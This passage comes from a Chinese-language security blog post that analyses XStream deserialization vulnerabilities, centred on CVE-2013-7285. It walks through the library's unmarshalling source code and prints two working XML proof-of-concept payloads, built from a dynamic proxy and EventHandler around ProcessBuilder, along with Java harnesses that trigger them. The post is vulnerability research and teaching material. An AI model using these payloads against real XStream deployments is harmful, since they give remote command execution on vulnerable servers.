<span class="keyword">else</span> &#123;<span class="comment">// 如果缓存中没有，那么就在converter中寻找</span></span><br><span class="line">        Iterator iterator = <span class="keyword">this</span>.converters.iterator();</span><br><span class="line"></span><br><span class="line">        Converter converter;</span><br><span class="line">      <span class="comment">// 遍历converters找到符合的Converter</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!iterator.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"No converter specified for "</span> + type);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            converter = (Converter)iterator.next();</span><br><span class="line">        &#125; <span class="keyword">while</span>(!converter.canConvert(type));</span><br><span class="line"><span class="comment">// 把这次找到的放在缓存集合中</span></span><br><span class="line">        <span class="keyword">this</span>.typeToConverterMap.put(type, converter);</span><br><span class="line">        <span class="keyword">return</span> converter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在来到<code>return this.convert(parent, type, converter);</code>这句</p><p>会到<code>com.thoughtworks.xstream.core.TreeUnmarshaller#convert</code>这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">convert</span><span class="params">(Object parent, Class type, Converter converter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.types.push(type);</span><br><span class="line">     <span class="comment">// 会进入这里</span></span><br><span class="line">        Object result = converter.unmarshal(<span class="keyword">this</span>.reader, <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.types.popSilently();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ConversionException var6) &#123;</span><br><span class="line">        <span class="keyword">this</span>.addInformationTo(var6, type, converter, parent);</span><br><span class="line">        <span class="keyword">throw</span> var6;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var7) &#123;</span><br><span class="line">        ConversionException conversionException = <span class="keyword">new</span> ConversionException(var7);</span><br><span class="line">        <span class="keyword">this</span>.addInformationTo(conversionException, type, converter, parent);</span><br><span class="line">        <span class="keyword">throw</span> conversionException;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727200451023.png" alt="image-20210727200451023"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 构造Class类对象的instance实例，field没有赋值，都是默认值</span></span><br><span class="line">    Object result = <span class="keyword">this</span>.instantiateNewInstance(reader, context);</span><br><span class="line">  <span class="comment">// 对result的field赋值</span></span><br><span class="line">    result = <span class="keyword">this</span>.doUnmarshal(result, reader, context);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.serializationMethodInvoker.callReadResolve(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="有趣的Converter"><a href="#有趣的Converter" class="headerlink" title="有趣的Converter"></a>有趣的Converter</h2><p>Xstream在处理实现了Serializable接口和没有实现Serializable接口的类生成的对象时，<strong>方法是不一样</strong>的。</p><p>Xstream的思路是在反序列化时，通过不同的converter来处理不同类型的数据。</p><p>最外层的没有实现Serializable接口的类时用的是ReflectionConverter，该Converter的原理是通过反射获取类对象并通过反射为其每个属性进行赋值。</p><p>如果是处理实现了Serializable接口并且重写了readObject方法的对象时使用的是SerializableConverter，并且readObject方法也会被调用。</p><h1 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h1><p>影响范围：</p><ul><li>XStream version &lt;= 1.4.6 &amp; XStream version = 1.4.10</li></ul><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>经典老番<a href="https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/">动态代理那些事</a></p><h3 id="EventHandler"><a href="#EventHandler" class="headerlink" title="EventHandler"></a>EventHandler</h3><p>EventHandler也是实现了<code>InvocationHandler</code>接口的类</p><p>EventHandler用来监控接口中的方法被调用后执行EventHandler中成员变量指定的方法。</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727205609443.png" alt="image-20210727205609443" style="zoom:50%;"><p>注意两个属性：target , action</p><p>看个小例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">goodMorning</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">goodEvening</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">goodMorning</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Good Morning!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">goodEvening</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Good Evening!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tester</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloService hello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">        EventHandler start = <span class="keyword">new</span> EventHandler(<span class="keyword">new</span> ProcessBuilder(<span class="string">"open"</span>,<span class="string">"/Applications/Calculator.app"</span>), <span class="string">"start"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        HelloService o = (HelloService)Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), start);</span><br><span class="line">        o.goodMorning();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典老番，计算器弹出：</p><p>跟一下是怎么走的：</p><ol><li>EventHandler.invoke()：</li></ol><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728162602037.png" alt="image-20210728162602037" style="zoom:50%;"><ol start="2"><li><p>EventHandler.invokeInternal()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">(Object proxy, Method method, Object[] arguments)</span> </span>&#123;</span><br><span class="line">    String methodName = method.getName();</span><br><span class="line">    <span class="keyword">if</span> (method.getDeclaringClass() == Object<span class="class">.<span class="keyword">class</span>)  </span>&#123;</span><br><span class="line">        <span class="comment">// Handle the Object public methods.</span></span><br><span class="line">      <span class="comment">// 这里首先查看被调用的方法是不是hashCode、equals、toString</span></span><br><span class="line">        <span class="keyword">if</span> (methodName.equals(<span class="string">"hashCode"</span>))  &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Integer(System.identityHashCode(proxy));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">"equals"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (proxy == arguments[<span class="number">0</span>] ? Boolean.TRUE : Boolean.FALSE);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">"toString"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> proxy.getClass().getName() + <span class="string">'@'</span> + Integer.toHexString(proxy.hashCode());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (listenerMethodName == <span class="keyword">null</span> || listenerMethodName.equals(methodName)) &#123;</span><br><span class="line">        Class[] argTypes = <span class="keyword">null</span>;</span><br><span class="line">        Object[] newArgs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (eventPropertyName == <span class="keyword">null</span>) &#123;     <span class="comment">// Nullary method.</span></span><br><span class="line">            newArgs = <span class="keyword">new</span> Object[]&#123;&#125;;</span><br><span class="line">            argTypes = <span class="keyword">new</span> Class&lt;?&gt;[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Object input = applyGetters(arguments[<span class="number">0</span>], getEventPropertyName());</span><br><span class="line">            newArgs = <span class="keyword">new</span> Object[]&#123;input&#125;;</span><br><span class="line">            argTypes = <span class="keyword">new</span> Class&lt;?&gt;[]&#123;input == <span class="keyword">null</span> ? <span class="keyword">null</span> :</span><br><span class="line">                                   input.getClass()&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> lastDot = action.lastIndexOf(<span class="string">'.'</span>);</span><br><span class="line">            <span class="keyword">if</span> (lastDot != -<span class="number">1</span>) &#123;</span><br><span class="line">                target = applyGetters(target, action.substring(<span class="number">0</span>, lastDot));</span><br><span class="line">                action = action.substring(lastDot + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Method targetMethod = Statement.getMethod(</span><br><span class="line">                         target.getClass(), action, argTypes);</span><br><span class="line">            <span class="keyword">if</span> (targetMethod == <span class="keyword">null</span>) &#123;</span><br><span class="line">                targetMethod = Statement.getMethod(target.getClass(),</span><br><span class="line">                         <span class="string">"set"</span> + NameGenerator.capitalize(action), argTypes);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (targetMethod == <span class="keyword">null</span>) &#123;</span><br><span class="line">                String argTypeString = (argTypes.length == <span class="number">0</span>)</span><br><span class="line">                    ? <span class="string">" with no arguments"</span></span><br><span class="line">                    : <span class="string">" with argument "</span> + argTypes[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(</span><br><span class="line">                    <span class="string">"No method called "</span> + action + <span class="string">" on "</span> +</span><br><span class="line">                    target.getClass() + argTypeString);</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="comment">// 在这里通过反射调用方法</span></span><br><span class="line">            <span class="keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            Throwable th = ex.getTargetException();</span><br><span class="line">            <span class="keyword">throw</span> (th <span class="keyword">instanceof</span> RuntimeException)</span><br><span class="line">                    ? (RuntimeException) th</span><br><span class="line">                    : <span class="keyword">new</span> RuntimeException(th);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>MethodUtil.invoke(targetMethod, target, newArgs)形成了方法调用：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728163105680.png" alt="image-20210728163105680" style="zoom:50%;"></li></ol><p>在这个例子里面：</p><p>targetMethod：ProcessBuilder.start()方法  （action参数）</p><p>target：构造好带有恶意命令的ProcessBuilder对象</p><p>在这里被invoke触发了</p><p>targetMethod哪里来的？就是一开始的action参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method targetMethod = Statement.getMethod(target.getClass(), action, argTypes);</span><br></pre></td></tr></table></figure><p>看看Converter里面如何解析动态代理对象</p><p><strong>DynamicProxyConverter</strong></p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728164911936.png" alt="image-20210728164911936"></p><p>如图，xml对应的标签就是<code>&lt;dynamic-proxy&gt;</code>，这其中：</p><p><code>&lt;interface&gt;</code>标签就是被代理的接口</p><p><code>&lt;handler&gt;</code>标签表示InvocationHandler实例</p><p>按照官网的这个例子：</p><blockquote><p> dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。</p></blockquote><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><h3 id="基于接口"><a href="#基于接口" class="headerlink" title="基于接口"></a>基于接口</h3><p>这种也是官网钦定的PoC，interfece字段随便选择一个public接口就行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.thoughtworks.xstream.io.HierarchicalStreamReader<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Interface_Exploit</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream payload = XStreamUtils.getPayload(<span class="string">"CVE_2013_7285_Interface"</span>);</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        HierarchicalStreamReader obj = (HierarchicalStreamReader)xStream.fromXML(payload);</span><br><span class="line">        obj.hasMoreChildren();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我为了省事，选的是<code>com.thoughtworks.xstream.io.HierarchicalStreamReader</code>接口+它内部的<code>hasMoreChildren</code>无参方法。</p><p>调试就是上面EventHandler那部分，这种方式结合了动态代理。</p><h3 id="基于SortedSet"><a href="#基于SortedSet" class="headerlink" title="基于SortedSet"></a>基于SortedSet</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortedSet_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream payload = XStreamUtils.getPayload(<span class="string">"CVE_2013_7285_SortedSet"</span>);</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        xStream.fromXML(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试：</p><p>fromXML跟进去，到<code>com.thoughtworks.xstream.core.TreeUnmarshaller#start</code>，这里代表开始解析xml还原obj：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">start</span><span class="params">(DataHolder dataHolder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataHolder = dataHolder;</span><br><span class="line">  <span class="comment">// 通过mapper获取对应节点的Class对象</span></span><br><span class="line">    Class type = HierarchicalStreams.readClassType(<span class="keyword">this</span>.reader, <span class="keyword">this</span>.mapper);</span><br><span class="line">  <span class="comment">//Converter根据Class的类型转化成java对象</span></span><br><span class="line">    Object result = <span class="keyword">this</span>.convertAnother((Object)<span class="keyword">null</span>, type);</span><br><span class="line">    Iterator validations = <span class="keyword">this</span>.validationList.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(validations.hasNext()) &#123;</span><br><span class="line">        Runnable runnable = (Runnable)validations.next();</span><br><span class="line">        runnable.run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们先进<code>readClassType</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title">readClassType</span><span class="params">(HierarchicalStreamReader reader, Mapper mapper)</span> </span>&#123;</span><br><span class="line">    String classAttribute = readClassAttribute(reader, mapper);</span><br><span class="line">    Class type;</span><br><span class="line">    <span class="keyword">if</span> (classAttribute == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 通过节点名获取Mapper中对应的Class对象</span></span><br><span class="line">        type = mapper.realClass(reader.getNodeName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        type = mapper.realClass(classAttribute);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先进入<code>readClassAttribute</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClassAttribute</span><span class="params">(HierarchicalStreamReader reader, Mapper mapper)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 尝试在xml里获取resolves-to和class标签</span></span><br><span class="line">    String attributeName = mapper.aliasForSystemAttribute(<span class="string">"resolves-to"</span>);</span><br><span class="line">    String classAttribute = attributeName == <span class="keyword">null</span> ? <span class="keyword">null</span> : reader.getAttribute(attributeName);</span><br><span class="line">    <span class="keyword">if</span> (classAttribute == <span class="keyword">null</span>) &#123;</span><br><span class="line">        attributeName = mapper.aliasForSystemAttribute(<span class="string">"class"</span>);</span><br><span class="line">        <span class="keyword">if</span> (attributeName != <span class="keyword">null</span>) &#123;</span><br><span class="line">            classAttribute = reader.getAttribute(attributeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> classAttribute;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里返回为空，继续来看到<code>com.thoughtworks.xstream.core.util.HierarchicalStreams#readClass</code>方法</p><p>获取当前节点的名称，并进行返回对应的class对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Class <span class="title">realClass</span><span class="params">(String elementName)</span> </span>&#123;</span><br><span class="line">    Object cached = <span class="keyword">this</span>.realClassCache.get(elementName);</span><br><span class="line">    <span class="keyword">if</span> (cached != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cached <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            <span class="keyword">return</span> (Class)cached;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> (CannotResolveClassException)cached;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class result = <span class="keyword">super</span>.realClass(elementName);</span><br><span class="line">          <span class="comment">//找到别名应的类，存储到realClassCache中，并且进行返回。</span></span><br><span class="line">            <span class="keyword">this</span>.realClassCache.put(elementName, result);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotResolveClassException var4) &#123;</span><br><span class="line">            <span class="keyword">this</span>.realClassCache.put(elementName, var4);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到start方法中：该执行<code>Object result = this.convertAnother((Object)null, type);</code>这里：</p><p>进入this.convertAnother方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">convertAnother</span><span class="params">(Object parent, Class type, Converter converter)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//根据mapper获取type实现类</span></span><br><span class="line">    type = <span class="keyword">this</span>.mapper.defaultImplementationOf(type);</span><br><span class="line">    <span class="keyword">if</span> (converter == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">//根据type找到对应的converter</span></span><br><span class="line">        converter = <span class="keyword">this</span>.converterLookup.lookupConverterForType(type);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> 